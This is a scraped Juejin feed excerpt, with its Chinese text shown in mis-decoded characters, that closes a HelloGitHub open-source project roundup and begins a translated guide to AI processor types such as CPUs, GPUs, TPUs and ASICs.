<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9336a5651d784fb8ae47da73d1ad3965~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=OzA2a2L3Al1gGbiQeUzxPDjkx9w%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸»è¯­è¨€ï¼šC++</strong></p>
<p>è¿™æ˜¯ä¸€æ¬¾å¼€æºã€è½»é‡çº§çš„è·¨å¹³å°è¿œç¨‹æ¡Œé¢å·¥å…·ï¼Œæ”¯æŒä¸åŒè®¾å¤‡é—´ï¼ˆWindowsã€Linux å’Œ macOSï¼‰çš„è¿œç¨‹æ¡Œé¢æ§åˆ¶å’ŒéŸ³è§†é¢‘ä¼ è¾“ï¼Œç‰¹ç‚¹æ˜¯å¯ç›´æ¥é€šè¿‡æµè§ˆå™¨æ§åˆ¶è¿œç¨‹è®¾å¤‡ï¼Œæ— éœ€é¢å¤–å®‰è£…ä»»ä½•åº”ç”¨ã€‚</p>
<blockquote>
<p>é¡¹ç›®è¯¦æƒ…â†’<a href="https://link.juejin.cn?target=https%3A%2F%2Fhellogithub.com%2Frepository%2Fkunkundi%2Fcrossdesk" target="_blank" title="https://hellogithub.com/repository/kunkundi/crossdesk" ref="nofollow noopener noreferrer">hellogithub.com/repository/â€¦</a></p>
</blockquote>
<h3 data-id="heading-8">2.2 å¼€æºçš„ Android ç™½å™ªéŸ³åº”ç”¨ï¼šXMSLEEP</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5afce9f7e134ddb872f46e0dc815171~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930901&amp;x-signature=34EZEIl2KVQPPrJ4pDdJfTWdvmE%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸»è¯­è¨€ï¼šKotlin</strong></p>
<p>è¿™æ˜¯ä¸€ä¸ªä¸“æ³¨äºç™½å™ªéŸ³æ’­æ”¾çš„ Android åº”ç”¨ï¼Œæä¾›é›¨å£°ã€ç¯ç«ã€é›·å£°ã€çŒ«å’ªå‘¼å™œã€é¸Ÿé¸£ã€å¤œè™«ç­‰å¤šç§è‡ªç„¶å£°éŸ³ï¼Œå¸®åŠ©ä½ æ”¾æ¾ã€å†¥æƒ³å’Œå…¥ç¡ã€‚</p>
<blockquote>
<p>é¡¹ç›®è¯¦æƒ…â†’<a href="https://link.juejin.cn?target=https%3A%2F%2Fhellogithub.com%2Frepository%2FTosencen%2FXMSLEEP" target="_blank" title="https://hellogithub.com/repository/Tosencen/XMSLEEP" ref="nofollow noopener noreferrer">hellogithub.com/repository/â€¦</a></p>
</blockquote>
<h2 data-id="heading-9">3. ç»“å°¾</h2>
<p>ä»¥ä¸Šå°±æ˜¯æœ¬æœŸã€ŒGitHub çƒ­ç‚¹é€Ÿè§ˆã€çš„å…¨éƒ¨å†…å®¹ï¼Œæˆ‘å§‹ç»ˆåšä¿¡ï¼šå…´è¶£æ˜¯æœ€å¥½çš„è€å¸ˆï¼å¸Œæœ›è¿™äº›å¼€æºé¡¹ç›®èƒ½æ¿€å‘ä½ çš„å…´è¶£ï¼Œè®©ä½ æ‰¾åˆ°ä¸‹ä¸€ä¸ªæƒ³å°è¯•å’Œå­¦ä¹ çš„å¼€æºé¡¹ç›®ã€‚å¦‚æœä½ ä¹Ÿå‘ç°äº†å¥½ç©ã€æœ‰è¶£çš„ GitHub å¼€æºé¡¹ç›®æƒ³è¦åˆ†äº«ï¼Œæ¬¢è¿æ¥ <a href="https://link.juejin.cn?target=https%3A%2F%2Fhellogithub.com" target="_blank" title="https://hellogithub.com" ref="nofollow noopener noreferrer">HelloGitHub</a> ä¸æˆ‘ä»¬äº¤æµã€è®¨è®ºä½¿ç”¨ä½“éªŒã€‚</p>
<p><strong>å¾€æœŸå›é¡¾</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F44TR75pFspRM3kGf-6gU2Q" target="_blank" title="https://mp.weixin.qq.com/s/44TR75pFspRM3kGf-6gU2Q" ref="nofollow noopener noreferrer">èŠ‚çœ 60% Token çš„æ–°æ•°æ®æ ¼å¼</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fn_junef2MC3GTV7leQy-Ww" target="_blank" title="https://mp.weixin.qq.com/s/n_junef2MC3GTV7leQy-Ww" ref="nofollow noopener noreferrer">DIY ChatGPT ä¸€å‘¨ç‹‚æ½ 27k Star</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI å¤„ç†å™¨å…¨æ™¯æŒ‡å—ï¼ˆCPUã€GPUã€TPUã€APUã€NPUã€IPUã€RPU...ï¼‰]]></title>    <link>https://juejin.cn/post/7581888578507128859</link>    <guid>https://juejin.cn/post/7581888578507128859</guid>    <pubDate>2025-12-10T00:23:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507128859" data-draft-id="7581691182003961866" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI å¤„ç†å™¨å…¨æ™¯æŒ‡å—ï¼ˆCPUã€GPUã€TPUã€APUã€NPUã€IPUã€RPU...ï¼‰"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,GPU,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-10T00:23:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Baihai_IDP"/> <meta itemprop="url" content="https://juejin.cn/user/3123071228582343"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI å¤„ç†å™¨å…¨æ™¯æŒ‡å—ï¼ˆCPUã€GPUã€TPUã€APUã€NPUã€IPUã€RPU...ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3123071228582343/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Baihai_IDP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:23:08.000Z" title="Wed Dec 10 2025 00:23:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»23åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>ç¼–è€…æŒ‰ï¼š</strong> å½“å¤§æ¨¡å‹çš„ç®—åŠ›éœ€æ±‚å‘ˆæŒ‡æ•°çº§å¢é•¿ï¼ŒGPU è¿˜æ˜¯å”¯ä¸€ç­”æ¡ˆå—ï¼Ÿåœ¨ AI ç¡¬ä»¶å†›å¤‡ç«èµ›æ„ˆæ¼”æ„ˆçƒˆçš„ä»Šå¤©ï¼Œæ˜¯å¦å­˜åœ¨æ›´é«˜æ•ˆã€æ›´ä¸“ç²¾ã€ç”šè‡³æ›´å…·é¢ è¦†æ€§çš„æ›¿ä»£æ–¹æ¡ˆï¼Ÿ</p>
<p>æˆ‘ä»¬ä»Šå¤©ä¸ºå¤§å®¶å¸¦æ¥çš„æ–‡ç« ï¼Œä½œè€…çš„æ ¸å¿ƒè§‚ç‚¹æ˜¯ï¼šAI ç¡¬ä»¶ç”Ÿæ€æ­£åœ¨è¿…é€Ÿå¤šå…ƒåŒ–ï¼Œé™¤äº†å¹¿ä¸ºäººçŸ¥çš„ CPUã€GPU å’Œ TPU ä¹‹å¤–ï¼Œä¸€ç³»åˆ—æ–°å…´æ¶æ„ â€”â€” å¦‚ ASICã€NPUã€IPUã€FPGA ä¹ƒè‡³å­˜å†…è®¡ç®—ä¸ç¥ç»å½¢æ€èŠ¯ç‰‡ï¼Œæ­£ä»ä¸åŒç»´åº¦é‡å¡‘ AI çš„ç®—åŠ›æœªæ¥ã€‚</p>
<p>æ–‡ç« ç³»ç»Ÿæ¢³ç†äº†ä¸‰å¤§ç»å…¸å¤„ç†å•å…ƒï¼ˆCPUã€GPUã€TPUï¼‰çš„åŸç†ä¸å±€é™ï¼Œå¹¶æ·±å…¥å‰–æäº†åŒ…æ‹¬ Cerebras æ™¶åœ†çº§å¼•æ“ã€AWS Trainium/Inferentiaã€AMD APUã€NPU åœ¨å†…çš„ä¸“ç”¨èŠ¯ç‰‡è®¾è®¡æ€è·¯ï¼›è¿›è€Œæ‹“å±•è‡³ IPUã€RPUã€FPGA ç­‰å‰æ²¿æ¶æ„ï¼Œæ­ç¤ºå®ƒä»¬å¦‚ä½•é’ˆå¯¹ç¨€ç–è®¡ç®—ã€å›¾ç¥ç»ç½‘ç»œã€è¾¹ç¼˜æ¨ç†æˆ–å­˜ç®—ä¸€ä½“ç­‰ç‰¹å®šåœºæ™¯æä¾›çªç ´æ€§æ€§èƒ½ã€‚</p>
</blockquote>
<p><strong>ä½œè€… | Ksenia Se and Alyona Vert</strong></p>
<p><strong>ç¼–è¯‘ | å²³æ‰¬</strong></p>
<h2 data-id="heading-0"><strong>ç›®å½•</strong></h2>
<p><strong>01 CPUã€GPUã€TPU â€“ ä¸‰ç§æ ¸å¿ƒç¡¬ä»¶æ¶æ„</strong></p>
<p>1.1 ä¸­å¤®å¤„ç†å•å…ƒï¼ˆCentral Processing Unit, CPUï¼‰</p>
<p>1.2 å›¾å½¢å¤„ç†å•å…ƒï¼ˆGraphics Processing Unit, GPUï¼‰</p>
<p>1.3 å¼ é‡å¤„ç†å•å…ƒï¼ˆTensor Processing Unit, TPUï¼‰</p>
<p><strong>02 ä¸“ç”¨é›†æˆç”µè·¯ï¼ˆApplication-Specific Integrated Circuits, ASICsï¼‰</strong></p>
<p>2.1 Cerebras æ™¶åœ†çº§å¼•æ“ï¼ˆWafer-Scale Engine, WSEï¼‰</p>
<p>2.2 AWS Trainium ä¸ AWS Inferentia</p>
<p>2.3 åŠ é€Ÿå¤„ç†å•å…ƒï¼ˆAccelerated Processing Unit, APUï¼‰</p>
<p>2.4 ç¥ç»ç½‘ç»œå¤„ç†å•å…ƒï¼ˆNeural Processing Unit, NPUï¼‰</p>
<p><strong>03 å…¶ä»–æœ‰å‰æ™¯çš„æ›¿ä»£æ¶æ„</strong></p>
<p>3.1 æ™ºèƒ½å¤„ç†å•å…ƒï¼ˆIntelligence Processing Unit, IPUï¼‰</p>
<p>3.2 é˜»å˜å¤„ç†å•å…ƒï¼ˆResistive Processing Unit, RPUï¼‰</p>
<p>3.3 ç°åœºå¯ç¼–ç¨‹é—¨é˜µåˆ—ï¼ˆField-Programmable Gate Arrays, FPGAsï¼‰</p>
<p><strong>04 æ–°å…´æ¶æ„ï¼ˆEmerging Architecturesï¼‰</strong></p>
<p>4.1 é‡å­å¤„ç†å™¨ï¼ˆQuantum Processorsï¼‰</p>
<p>4.2 å­˜å†…è®¡ç®—ï¼ˆProcessing-in-Memory, PIMï¼‰ä¸åŸºäº MRAM çš„èŠ¯ç‰‡</p>
<p>4.3 ç¥ç»å½¢æ€èŠ¯ç‰‡ï¼ˆNeuromorphic Chipsï¼‰</p>
<p><strong>05 ç»“è¯­ï¼ˆConclusionï¼‰</strong></p>
<hr/>
<p>å¦‚ä»Šè¿å°å­©å­éƒ½çŸ¥é“ GPUï¼ˆå›¾å½¢å¤„ç†å•å…ƒï¼‰æ˜¯ä»€ä¹ˆäº† â€”â€” è¿™å¾—å½’åŠŸäº AIï¼Œä¹Ÿå½’åŠŸäºè‹±ä¼Ÿè¾¾ï¼ˆNvidiaï¼‰ï¼Œå®ƒå§‹ç»ˆåœ¨ä¸é—ä½™åŠ›åœ°æ¨è¿›è‡ªå®¶èŠ¯ç‰‡çš„å‘å±•ã€‚å½“ç„¶ï¼Œç¡¬ä»¶æ—¢æ˜¯ç»Šè„šçŸ³ï¼Œä¹Ÿæ˜¯æ¨åŠ¨æ¨¡å‹è¿è¡ŒåŠå…¶æŠ€æœ¯æ ˆçš„å¼•æ“ã€‚ä½†ä¸ºä»€ä¹ˆäººä»¬è®¨è®ºçš„ç„¦ç‚¹åªé›†ä¸­åœ¨ GPU ä¸Šå‘¢ï¼Ÿéš¾é“æ²¡æœ‰å…¶ä»–ç«äº‰è€…å¯èƒ½å¡‘é€  AI ç¡¬ä»¶çš„æœªæ¥å—ï¼ŸCPU å’Œ TPU å½“ç„¶ç®— â€”â€” ä½†ä»…æ­¤è€Œå·²å—ï¼Ÿ</p>
<p>ä»Šå¤©ï¼Œè®©æˆ‘ä»¬è·³å‡º GPU çš„æ€ç»´èŒ§æˆ¿ï¼Œå°†è§†çº¿æ‹“å±•åˆ° GPUã€CPUã€TPU è¿™â€œè€ä¸‰æ ·â€ä¹‹å¤–ã€‚å…¨çƒå¼€å‘è€…ä¸€ç›´åœ¨æ¢ç´¢å„ç±»æ›¿ä»£è®¾è®¡æ–¹æ¡ˆï¼Œæ¯ä¸€ç§éƒ½æ‰¿è¯ºå¸¦æ¥å¯è§‚çš„æ•ˆç‡æå‡å’Œå…¨æ–°çš„åˆ›æ–°è·¯å¾„ã€‚</p>
<p>æˆ‘ä»¬å¸Œæœ›èƒ½å„ä½è¯»è€…æ‰“é€ ä¸€ä»½å®Œæ•´çš„ AI ç¡¬ä»¶æŒ‡å—ï¼Œå› æ­¤å…ˆä»è¿™ä¸‰å¤§å·¨å¤´è®²èµ·ï¼Œå†è½¬å‘é‚£äº›è™½ä¸ä¸»æµå´å†…æœ‰ä¹¾å¤çš„æ–¹æ¡ˆï¼šä¾‹å¦‚ Cerebras WSE å’Œ AWS è‡ªç ”çš„å®šåˆ¶ ASICï¼›è¿˜æœ‰ APUã€NPUã€IPUã€RPU ä»¥åŠ FPGAã€‚æˆ‘ä»¬ä¼šå¸®ä½ å˜æ¸…è¿™äº›æœ¯è¯­ï¼Œè®©ä½ å…¨é¢æŒæ¡ AI ç¡¬ä»¶çš„å®Œæ•´å›¾æ™¯ã€‚è¿™ç¯‡æ–‡ç« å¿…å°†è®©ä½ æ”¶è·æ»¡æ»¡ï¼</p>
<h2 data-id="heading-1"><strong>01 CPUã€GPUã€TPU â€“ ä¸‰ç§æ ¸å¿ƒç¡¬ä»¶æ¶æ„</strong></h2>
<p>åœ¨æ¢è®¨å…¶ä»–æ›¿ä»£æ–¹æ¡ˆä¹‹å‰ï¼Œå…ˆæ¥å‰–æä¸€ä¸‹è¿™äº›æˆ‘ä»¬è€³ç†Ÿèƒ½è¯¦çš„ CPUã€GPU å’Œ TPU åˆ°åº•æ˜¯ä»€ä¹ˆã€‚</p>
<p>è¿™ä¸‰å¤§å·¨å¤´éƒ½å±äºå¤„ç†å•å…ƒï¼ˆProcessing Unitsï¼Œç®€ç§° PUsï¼‰ â€”â€” å³ä¸“é—¨ç”¨äºæ‰§è¡Œè½¯ä»¶ç¨‹åºæŒ‡ä»¤ã€è¿›è¡Œè®¡ç®—çš„ç”µå­ç”µè·¯ã€‚è®¸å¤šäººç§°å®ƒä»¬ä¸ºè®¡ç®—æœºç³»ç»Ÿçš„â€œå¤§è„‘â€ã€‚PUs æ‰§è¡Œå„ç±»ç®—æœ¯ã€é€»è¾‘ã€æ§åˆ¶ä»¥åŠè¾“å…¥/è¾“å‡ºæ“ä½œï¼Œå°†åŸå§‹æ•°æ®å¤„ç†æˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚</p>
<p>ä¸åŒç±»å‹çš„ PU é’ˆå¯¹ä¸åŒçš„å·¥ä½œè´Ÿè½½è¿›è¡Œäº†ä¼˜åŒ– â†’</p>
<h3 data-id="heading-2"><strong>1.1 ä¸­å¤®å¤„ç†å•å…ƒï¼ˆCentral Processing Unit, CPUï¼‰</strong></h3>
<p>ä¸­å¤®å¤„ç†å•å…ƒï¼ˆCPUï¼‰ä¸“ä¸ºé€šç”¨è®¡ç®—å’Œé¡ºåºä»»åŠ¡æ‰§è¡Œè€Œè®¾è®¡ã€‚</p>
<p>CPU æ˜¯ä¸‰è€…ä¸­æœ€å¤è€çš„ã€‚å…¶å‰èº«çš„æ•…äº‹å§‹äº 1945 å¹´ â€”â€” çº¦ç¿°Â·è«å¥‡åˆ©ï¼ˆJohn Mauchlyï¼‰ä¸ J. æ™®é›·æ–¯ç€Â·åŸƒå…‹ç‰¹ï¼ˆJ. Presper Eckert Jr.ï¼‰æ¨å‡ºäº† ENIACï¼ˆElectronic Numerical Integrator and Computerï¼‰ã€‚è¿™æ˜¯ä¸–ç•Œä¸Šç¬¬ä¸€å°å¯ç¼–ç¨‹ã€ç”µå­å¼ã€é€šç”¨å‹çš„æ•°å­—è®¡ç®—æœºï¼Œèƒ½é€šè¿‡é‡æ–°ç¼–ç¨‹è§£å†³å¤šç§æ•°å€¼é—®é¢˜ï¼Œä½¿ç”¨äº†çº¦ 18,000 ä¸ªçœŸç©ºç®¡ã€‚</p>
<p>åŒå¹´ï¼Œçº¦ç¿°Â·å†¯Â·è¯ºä¾æ›¼ï¼ˆJohn von Neumannï¼‰å‘è¡¨äº†ã€ŠFirst Draft of a Report on the EDVACã€‹ï¼Œæå‡ºå°†æ•°æ®å’ŒæŒ‡ä»¤å­˜å‚¨åœ¨åŒä¸€å†…å­˜ä¸­ã€‚è¿™ä¸€â€œå­˜å‚¨ç¨‹åºâ€æ¨¡å‹æˆä¸ºç°ä»£ CPU çš„è®¾è®¡è“æœ¬ã€‚</p>
<p>åˆ°äº† 1950 å¹´ä»£ä¸­æœŸï¼ŒçœŸç©ºç®¡è¢«æ™¶ä½“ç®¡å–ä»£ã€‚ä»é‚£æ—¶èµ·ï¼Œå¤„ç†å™¨å¼€å§‹ç”±å¤§é‡åŸºäºæ™¶ä½“ç®¡çš„å…ƒä»¶ç»„æˆï¼Œå¹¶å®‰è£…åœ¨ç”µè·¯æ¿ä¸Šï¼Œä½¿è®¡ç®—æœºå˜å¾—æ›´å°ã€æ›´å¿«ã€æ›´çœç”µã€‚</p>
<p>1960 å¹´ä»£ï¼Œé›†æˆç”µè·¯ï¼ˆICsï¼‰å‡ºç°ï¼Œå°†å¤šä¸ªæ™¶ä½“ç®¡é›†æˆåˆ°å•å—ç¡…ç‰‡ä¸Šã€‚æœ€ç»ˆåœ¨ 1971 å¹´ï¼Œè‹±ç‰¹å°”ï¼ˆIntelï¼‰æ¨å‡ºäº† 4004 â€”â€” å…¨çƒé¦–æ¬¾å•†ç”¨å¾®å¤„ç†å™¨ï¼Œå³ä¸€é¢—é›†æˆåœ¨å•ä¸€èŠ¯ç‰‡ä¸Šçš„ 4 ä½ CPUã€‚è¿™æ ‡å¿—ç€ç°ä»£ CPU çš„çœŸæ­£è¯ç”Ÿã€‚</p>
<p>Intel 8086 æ˜¯å¦‚ä»Š x86 CPU æ¶æ„çš„å§‹ç¥–ï¼Œè€Œç›®å‰æå‡æ•ˆç‡çš„ä¸»æµæ–¹æ¡ˆåˆ™æ˜¯å¤šæ ¸å¤„ç†å™¨ â€”â€” å°†å¤šä¸ª CPU æ ¸å¿ƒé›†æˆåœ¨å•ä¸€èŠ¯ç‰‡ä¸Šã€‚</p>
<p>é‚£ä¹ˆï¼Œç°ä»£ CPU å†…éƒ¨ç©¶ç«ŸåŒ…å«ä»€ä¹ˆï¼Ÿå®ƒä»¬åˆæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</p>
<p>CPU çš„æ ¸å¿ƒæ˜¯æ§åˆ¶å•å…ƒï¼ˆcontrol unitï¼‰ï¼Œå®ƒåŒ…å«å¤æ‚çš„ç”µè·¯ï¼Œé€šè¿‡å‘å‡ºç”µä¿¡å·æ¥æ§åˆ¶æ•´å°è®¡ç®—æœºï¼Œå¹¶å°†æ•°æ®å’ŒæŒ‡ä»¤å¼•å¯¼è‡³æ­£ç¡®çš„ä½ç½®ã€‚ç®—æœ¯é€»è¾‘å•å…ƒï¼ˆALUï¼‰è´Ÿè´£æ‰§è¡Œæ•°å­¦ä¸é€»è¾‘è¿ç®—ï¼Œè€Œå¯„å­˜å™¨ï¼ˆregistersï¼‰å’Œé«˜é€Ÿç¼“å­˜ï¼ˆcacheï¼‰åˆ™æä¾›äº†æå°ä½†æå¿«çš„å­˜å‚¨ç©ºé—´ï¼Œç”¨äºå­˜æ”¾å¤„ç†å™¨é¢‘ç¹éœ€è¦çš„æ•°æ®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9cc7b3f8f98e4060801df745f6f64e59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmFpaGFpX0lEUA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765930988&amp;x-signature=H%2BPPAlfo1bekNi7W9JzvALUWH1I%3D" alt="image.png" loading="lazy"/></p>
<p>Image Credit: Wikipedia</p>
<p>CPU è¿˜åŒ…å«æ ¸å¿ƒï¼ˆcoresï¼‰ â€”â€” å³ CPU å†…éƒ¨çš„å¤„ç†å•å…ƒï¼Œæ¯ä¸ªæ ¸å¿ƒéƒ½èƒ½ç‹¬ç«‹å¤„ç†æŒ‡ä»¤ï¼›ä»¥åŠçº¿ç¨‹ï¼ˆthreadsï¼‰ï¼Œå…è®¸ä¸€ä¸ªæ ¸å¿ƒåŒæ—¶å¤„ç†å¤šæ¡æŒ‡ä»¤æµã€‚è¿™äº›ç»„ä»¶éƒ½æŒ‰ç…§æ—¶é’Ÿä¿¡å·ï¼ˆclockï¼‰çš„èŠ‚æ‹è¿è¡Œï¼Œæ—¶é’Ÿæä¾›äº†åŒæ­¥æ•´ä¸ªç³»ç»Ÿæ‰€éœ€çš„èŠ‚æ‹ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰æ€»çº¿ï¼ˆbusesï¼Œç”¨äºæ•°æ®ä¼ è¾“ï¼‰ã€æŒ‡ä»¤å¯„å­˜å™¨ï¼ˆinstruction registerï¼‰å’ŒæŒ‡ä»¤æŒ‡é’ˆï¼ˆinstruction pointerï¼Œç”¨äºè¿½è¸ªä¸‹ä¸€æ­¥è¦æ‰§è¡Œçš„å†…å®¹ï¼‰ç­‰è¾…åŠ©ç»„ä»¶ï¼Œå°†æ•´ä¸ªç³»ç»Ÿç´§å¯†è¿æ¥ï¼Œä½¿æŒ‡ä»¤èƒ½é¡ºç•…åœ°ä»ä¸€ä¸ªæ­¥éª¤æµè½¬åˆ°ä¸‹ä¸€ä¸ªã€‚</p>
<p>CPU çš„å·¥ä½œéµå¾ªä¸€ä¸ªç®€å•å´å¼ºå¤§çš„å¾ªç¯ï¼š<strong>å–æŒ‡ï¼ˆfetchï¼‰â†’ è¯‘ç ï¼ˆdecodeï¼‰â†’ æ‰§è¡Œï¼ˆexecuteï¼‰</strong> ã€‚</p>
<ul>
<li>å®ƒä»å†…å­˜ä¸­å–æŒ‡æ•°æ®æˆ–æŒ‡ä»¤ï¼Œ</li>
<li>å°†å®ƒä»¬è¯‘ç ä¸ºç¡¬ä»¶èƒ½ç†è§£çš„ä¿¡å·ï¼Œ</li>
<li>ç„¶åæ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆä¾‹å¦‚è®¡ç®—ã€æ•°å€¼æ¯”è¾ƒï¼Œæˆ–å°†æ•°æ®å‘é€åˆ°å…¶ä»–åœ°æ–¹ï¼‰ã€‚</li>
</ul>
